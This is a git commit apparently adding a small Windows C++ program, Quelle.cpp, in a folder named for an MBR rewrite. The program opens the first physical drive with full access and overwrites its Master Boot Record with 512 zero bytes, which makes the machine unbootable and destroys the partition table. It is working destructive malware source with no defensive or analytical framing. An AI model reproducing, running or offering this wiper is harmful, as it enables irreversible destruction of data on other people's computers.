490e8586934a10bea4ffb2b38150ffd26d0462c4
Krypton | Blue Bluna | Beinman <Bluna@users.noreply.github.com>
2017-11-02 17:30:12 +0100

    Initial commit

---
+++ MoBvRerwrite/Quelle.cpp
@@ -0,0 +1,30 @@
+﻿#include <Windows.h>
+#include <iostream>
+#include <string>
+using namespace std;
+#define MBR_SIZE 512
+
+
+
+int main()
+{
+	DWORD write;
+	char mbrData[MBR_SIZE];
+	ZeroMemory(&mbrData, (sizeof mbrData));
+
+	HANDLE MasterBootRecord = CreateFileA("\\\\.\\PhysicalDrive0"
+		, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE
+		, NULL, OPEN_EXISTING, NULL, NULL);
+		if (WriteFile(MasterBootRecord, mbrData, MBR_SIZE, &write, NULL) == TRUE) {
+			cout << "GUTE" << endl;
+			ExitProcess(0);
+		}
+		else {
+			cout << "Failed";
+			Sleep(5000);
+			ExitProcess(0);
+		}
+		CloseHandle(MasterBootRecord);
+		return EXIT_SUCCESS;
+
+}
